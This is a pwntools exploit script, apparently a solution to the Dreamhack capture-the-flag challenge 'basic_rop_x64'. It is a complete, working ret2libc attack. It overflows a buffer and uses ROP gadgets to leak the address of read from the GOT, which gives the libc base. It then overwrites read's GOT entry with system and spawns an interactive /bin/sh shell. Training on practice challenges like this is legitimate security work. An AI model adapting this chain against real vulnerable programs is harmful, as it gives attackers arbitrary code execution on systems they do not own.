from pwn import *

# p = remote('host3.dreamhack.games', 21460)
p = process('./basic_rop_x64')
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')
r = ROP(e)

def slog(name, addr): return success(': '.join([name, hex(addr)]))

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi'])[0]
ret = r.find_gadget(['ret'])[0]

# write(1, read_got, ...)
payload = b'A' * 0x40 + b'B' * 8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh")
payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(ret) + p64(read_plt)

p.send(payload)

# Calculate libc base
p.recvn(0x40)

read_addr = u64(p.recvn(6) + b'\x00' * 2)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']

slog('read', read_addr)
slog('libc base', libc_base)
slog('system', system_addr)

p.send(p64(system_addr) + b"/bin/sh\x00")

p.interactive()